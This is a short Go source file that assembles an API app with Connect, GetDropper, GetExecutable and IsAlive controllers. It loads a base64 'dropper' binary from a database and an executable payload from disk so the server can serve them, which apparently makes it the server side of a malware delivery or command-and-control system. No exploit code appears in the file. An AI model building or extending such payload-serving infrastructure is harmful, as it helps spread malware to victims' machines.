package api

import (
	"main/src/api/controllers/Connect"
	"main/src/api/controllers/GetDropper"
	"main/src/api/controllers/GetExecutable"
	"main/src/api/controllers/IsAlive"
	"main/src/api/shared"
	"main/src/api/shared/io"
	"main/src/api/variables"
	GetDropper2 "main/src/application/useCases/GetDropper"
	"main/src/infrastructure/database"
)

type App struct {
	ConnectController       Connect.ConnectController
	GetDropperController    GetDropper.GetDropperController
	GetExecutableController GetExecutable.GetExecutableController
	IsAliveController       IsAlive.IsAliveController
	Database                database.IDatabase
}

func BuildApp() (App, error) {
	configVariables := variables.GetConfig()

	database := database.Database{
		Config: configVariables,
	}

	binaryAsB64, err := database.GetDropperBinary()

	if err != nil {
		return App{}, err
	}

	return App{
		Database:          database,
		ConnectController: Connect.ConnectController{},
		GetDropperController: GetDropper.GetDropperController{
			UseCase: GetDropper2.GetDropperUseCase{
				Database: database,
				Payload: io.Payload{
					BytesAsB64: binaryAsB64,
				},
			},
		},
		GetExecutableController: GetExecutable.GetExecutableController{
			Payload: io.Payload{
				BytesAsB64: shared.GetPayloadFromDisk(configVariables.ExecutablePath),
			},
		},
		IsAliveController: IsAlive.IsAliveController{},
	}, nil
}
